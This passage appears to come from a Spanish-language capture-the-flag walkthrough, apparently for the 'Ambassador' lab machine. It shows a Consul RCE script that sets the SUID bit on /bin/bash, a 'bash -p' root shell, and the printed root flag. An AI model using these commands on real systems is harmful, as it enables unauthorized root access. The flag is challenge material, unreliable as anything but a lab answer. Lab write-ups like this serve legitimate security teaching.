python3 consul_rce.py -th 127.0.0.1 -tp 8500 -c 'chmod u+s /bin/bash' -ct bb03b43b-1d81-d62b-24b5-39540ee469b5
```

La petición **PUT** de **registro** tiene el siguiente aspecto:

![imagen 6](Pasted image 20230128121339.png)

Finalmente, ejecutaremos `bash -p`:

```bash
developer@ambassador:/tmp$ bash -p 
bash-5.0## whoami
root
```

### root.txt

Encontraremos el segunda *flag* en el *homedir* de *root*:

```bash
bash-5.0## cat root.txt 
137b1ee6091b1bf563244dacef5e3173
```






